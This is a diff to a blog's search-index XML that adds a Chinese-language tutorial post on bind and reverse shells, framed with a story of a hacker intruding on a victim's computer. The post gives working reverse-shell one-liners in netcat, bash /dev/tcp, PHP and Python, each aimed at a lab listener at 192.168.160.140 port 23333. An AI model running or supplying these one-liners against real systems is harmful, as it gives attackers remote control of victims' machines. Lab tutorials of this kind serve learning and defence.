@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>反弹shell</title>
+      <link href="/blog/%E5%8F%8D%E5%BC%B9shell/"/>
+      <url>/blog/%E5%8F%8D%E5%BC%B9shell/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>实际上，很早很早以前就听说过反弹shell，我最早做的网络安全实验就开始反弹shell。比如这个知乎live中的第三个实验TCP会话劫持，就反弹了shell。一年前在与攻防团队的交流会上，再次听到反弹shell，当时也没放在心上，反正挺重要的。直到今天，才算彻底明白反弹shell是咋回事。如果用一句话概述，那么反弹shell就是：</p><p>黑客控制了目标，弹一个shell，构建一个稳定的通信后门。</p><p>先弹shell就是正向shell，后连接<br>后弹shell就是反向shell，先监听<br>正向shell：客户端想要获得服务端的shell<br>假设小黑是一名黑客<br>他悄咪咪溜进了知乎总部大楼，发现一台刘看山的电脑，但是刘看山出门了<br>于是小黑通过nc将这台电脑的控制权通过23333端口发射出去<br>小黑做了一系列的操作，又悄咪咪的原路返航<br>回到家后，通过nc连上刘看山的电脑<br>后来，刘看山的隐私泄露了~<br>（这里小黑是客户端，刘看山是服务端，服务端发射shell）<br>反向shell：服务端想要获得客户端的shell（也就是反弹shell）<br>假设小黑是一名黑客<br>他悄咪咪溜进了知乎总部大楼，发现一台刘看山的电脑，但是刘看山出门了<br>小黑发现电脑里有一个有趣的文件（刘看山的秘密）<br>小黑下载这个文件到自己的U盘里，又悄咪咪的原路返航<br>回到家后，小黑打开这个文件<br>发现电脑被刘看山控制了~<br>（这里小黑是客户端，刘看山是服务端，客户端发射shell）<br>正向shell（服务端送shell）<br>第一步：在kali rolling（服务端）上监听23333端口，并反弹shell<br>nc -lvp 23333 -e /bin/sh</p><p><img src="01.jpg" alt=""></p><p>第二步：在ubuntu18（客户端）上连接kali rolling的23333端口<br>这个时候，客户端就拿到服务端的shell控制权了<br>可以随意控制服务端<br>nc 192.168.160.140 23333</p><p><img src="02.jpg" alt=""></p><p>反向shell（客户端送shell）<br>第一步：在ubuntu18上选择增强版的netcat<br>一般ubuntu默认的是free-bsd版本的nc<br>update-alternatives —config nc</p><p><img src="03.jpg" alt=""></p><p>第二步：在kali rolling上启动服务端，等待客户端上钩<br>客户端只要吃钩子，服务端就获得了客户端的shell控制权<br>可以随意控制客户端<br>nc -lvp 23333</p><p><img src="04.jpg" alt=""></p><p>第三步：在ubuntu18上启动客户端，吃钩子<br>nc 192.168.160.140 23333 -e /bin/sh</p><p><img src="05.jpg" alt=""></p><p>我们发现必须客户端和服务端都安装了nc才能实现反弹shell（反向shell）<br>但是如果其中一方没有安装nc怎么办？<br>bash反弹shell<br>服务端（kali rolling上监听23333）<br>客户端吃钩子，服务端就成功控制客户端了</p><p><img src="06.jpg" alt=""></p><p>客户端（ubuntu18上bash反弹shell）<br>bash -i &gt;&amp; /dev/tcp/192.168.160.140/23333 0&gt;&amp;1</p><p><img src="07.jpg" alt=""></p><p>php反弹shell<br>服务端（kali rolling上监听23333）<br>客户端吃钩子，服务端就成功控制客户端了</p><p><img src="08.jpg" alt=""></p><p>客户端（ubuntu18上bash反弹shell）<br>php -r ‘$f=fsockopen(“192.168.160.140”,23333);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p><p><img src="09.jpg" alt=""></p><p>python反弹shell<br>服务端（kali rolling上监听23333）<br>客户端吃钩子，服务端就成功控制客户端了</p><p><img src="10.jpg" alt=""></p><p>客户端（ubuntu18上bash反弹shell）<br>python -c ‘import socket,subprocess,os; \<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((“192.168.160.140”,23333));<br>os.dup2(s.fileno(),0);<br>os.dup2(s.fileno(),1);<br>os.dup2(s.fileno(),2);<br>p=subprocess.call([“/bin/sh”,”-i”]);’</p><p><img src="11.jpg" alt=""></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>网站渗透思路</title>
       <link href="/blog/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
       <url>/blog/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
